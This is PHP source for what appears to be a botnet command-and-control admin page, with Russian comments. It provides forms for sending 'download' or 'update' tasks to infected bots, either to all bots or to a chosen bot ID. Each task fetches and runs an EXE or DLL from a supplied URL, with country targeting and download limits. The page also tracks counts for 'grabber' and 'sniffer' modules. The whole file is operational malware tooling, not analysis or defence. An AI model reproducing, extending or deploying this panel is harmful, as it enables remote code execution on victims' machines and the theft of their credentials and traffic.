<?php
if (!@$pageIncluded) { 
	header ("Content-type: text/html; charset=utf-8");
	chdir('..');
	$dir='../';
} else { $dir=''; }

require_once("config.php");
require_once("ln/ln.php");
require_once("includes/mysql.php");

$db=new odbcClass();

require_once("includes/functions.php");

$config["language"] == "ru" ? $l = "ru" : $l = "en";

?>

<h1><?=$lang[$l][11];?></h1>

<!-- модальное окно редактирование задачи -->
<div id="editWindow" style="display:none;position:fixed;top:45%;left:45%;border:5px solid gray;padding:40px;padding-top:10px;background:#fff;text-align:left;">
	<span style="color:gray;cursor:pointer;margin-bottom:20px;display:block;" onClick="$(this).parent().hide()">X <?=$lang[$l][13];?></span>
	<form method="post" enctype="multipart/form-data" onsubmit="return false">
		<input type="hidden" id="editTaskID" value=""><br>
		<h1><?=$lang[$l][12];?></h1>
		<input type="text" id="ccusrEdit" style="width:230px;" value="">&nbsp;<input type="button" onMouseUp="doUpdateCc()"; value="<?=$lang[$l][14];?>"><br>
		<small id="explEdit"> <?=$lang[$l][15];?>: all or us,ua,ru</small><br><br>
		<h1><?=$lang[$l][16];?></h1>
		<input type="text" id="urlEdit" style="width:230px;" value="">&nbsp;<input type="button" onMouseUp="doUpdateUrl()"; value="<?=$lang[$l][14];?>"><br>
	</form>
</div>


<!-- форма загрузки -->
<form method="post" enctype="multipart/form-data" onsubmit="return false">
	<table cellspacing="0" width=100%>
		<tr><td width=100><?=$lang[$l][19];?></td>
			<td>
			<div id="ldn" style="display:none;position:fixed;top:45%;left:45%;border:5px solid gray;padding:40px;background:#fff;text-align:center;"><?=$lang[$l][20];?>...<br>
				<span style="color:gray;cursor:pointer;" onClick="$(this).parent().hide()"><?=$lang[$l][13];?></span>
			</div>
			
			<div id="noURL" style="display:none;"></div>
			<div id="urlLoadDiv" style="display:block;">
				<input type="text" size=50 value="http://" id="urlInput" name="url"> <input type="button" onMouseUp="doLoadUrl()"; value="<?=$lang[$l][18];?>">
			</div>
			</td>
		</tr>
		<tr>
			<td>File type</td>
			<td style="line-height:2em;">
				<label><input type="checkbox" class="bidToAll" checked="checked"> 4 all bots</label><br><label><input type="text" class="bidValue" maxlength="16" disabled="disabled"> bot bid (16 hex)</label><br>	
				<label><input type="radio" class="command" value="update" name="command" >Update</label>&nbsp;
				<label><input type="radio" class="command" value="download" name="command" checked="checked">Download</label><br>
				<label><input type="radio" class="fileType" value="exe" name="fileType" checked="checked">Exe</label>&nbsp;
				<label><input type="radio" class="fileType" value="dll" name="fileType">Dll</label><br>
				<label><input type="checkbox" class="isDllFunctionPresent" disabled="disabled">dll function call</label><br>
				<label style="display:none;" class="dllFunctionNameShow"><input type="text" name="dllFunctionName" class="dllFunctionName" autocomplete="off">dll function name</label><br>
				<label><input type="text" class="limitNumber" value='0'>downloads limit (0 - unlimited)</label><br>
			</td>
		</tr>
		<tr><td colspan=2>
			<label><input type="radio" checked name="sCCt" value="AutoSelect" onClick="CCinputType(this);"> <?=$lang[$l][23];?></label>
			<label><input type="radio" name="sCCt" value="ManualSelect" onClick="CCinputType(this);"> <?=$lang[$l][24];?></label>
		</td></tr>
		<tr><td colspan=2>
			<div style="width:100%;height:120px;overflow: auto;" id="ccall">
				<?=select_cc();?>
			</div>
			<input type="text" id="ccusr" style="display:none;outline:none;" value=""><small id="expl" style="display:none;"> <?=$lang[$l][15];?>: us,ua,ru</small>
		</td></tr>
	</table>
</form>
<br/>

<table cellspacing="0" id='modulesTable' border=1>
	<tr>
	<th>Module</th>
	<th>Downloads</th>
	</tr>
	<tbody>
		<?
			if(file_exists(GRABBERS_PATH)){
				$v=$db->query("SELECT * FROM gscounter WHERE `option` = 'grabbers'");
				echo $v[0]==0 ? '<tr><td>grabber</td><td>0</td></tr>' : '<tr><td>grabber</td><td>'.$v[0]['value'].'</td></tr>';
			}
			if(file_exists(SNIFFERS_PATH)){
				$v=$db->query("SELECT * FROM gscounter WHERE `option` = 'sniffers'");
				echo $v[0]==0 ? '<tr><td>sniffer</td><td>0</td></tr>' : '<tr><td>sniffer</td><td>'.$v[0]['value'].'</td></tr>';			
			}
		?>
	</tbody>
</table><br>

	<!-- список файлов -->
<table cellspacing="0" id='filesTable' border=1>
	<tr>
	<th>ID</th>
	<!-- <th><?=$lang[$l][25];?></th> -->
	<th>Url</th>
	<th>Command</th>
	<th>Flags</th>
	<th>Function Name</th>
	<th><?=$lang[$l][26];?></th>
	<th>Count</th>
	<th><?=$lang[$l][28];?></th>
	</tr>
	<tbody>
		<?=show_tasks();?>
	</tbody>
</table>
<div id="result"></div>